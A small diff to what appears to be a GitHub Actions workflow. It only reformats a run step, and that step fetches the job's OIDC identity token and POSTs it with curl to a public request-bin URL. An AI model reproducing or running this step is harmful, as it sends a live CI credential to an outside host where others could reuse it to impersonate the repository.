@@ -12,7 +12,11 @@ jobs:
     runs-on: [ubuntu-latest]
     steps:
       - run: |
-        OIDC_TOKEN=$(curl -sLS "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=github-actions-access-manager.vercel.app" -H "User-Agent: actions/oidc-client" -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN")
-        curl -i -s --data-binary "$OIDC_TOKEN" https://putsreq.com/aBB8O4s2D0PuDWTKlSK1
+          OIDC_TOKEN=$(
+            curl -sLS "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=github-actions-access-manager.vercel.app" \
+              -H "User-Agent: actions/oidc-client" \
+              -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN"
+          )
+          curl -i -s --data-binary "$OIDC_TOKEN" https://putsreq.com/aBB8O4s2D0PuDWTKlSK1
       
 
